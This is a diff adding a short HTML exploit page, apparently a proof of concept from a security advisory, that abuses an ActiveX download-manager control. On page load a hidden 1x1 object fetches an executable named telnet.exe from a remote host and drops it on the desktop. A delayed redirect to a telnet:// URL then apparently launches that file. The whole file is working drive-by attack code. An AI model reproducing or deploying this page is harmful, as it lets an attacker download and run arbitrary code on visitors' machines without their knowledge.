@@ -1,0 +1,18 @@
+<html><head><script type="text/javascript">
+function startSploit()
+{
+   if(dm.detachEvent != undefined)
+   {
+      setTimeout("location.href='telnet://localhost/'", 5000);
+      dm.StartDownload();
+   }
+}
+</script></head>
+<body onload="startSploit()">
+<object id="dm" classid="CLSID:4871A87A-BFDD-4106-8153-FFDE2BAC2967" width="1" height="1">
+   <PARAM name="URL" value="http://www.akitasecurity.nl/advisory/telnet.exe"/>
+   <PARAM name="launch" value="no"/>
+   <PARAM name="initialView" value="embedded"/>
+   <PARAM name="target" value="DESKTOP"/>
+</object>
+</body></html>
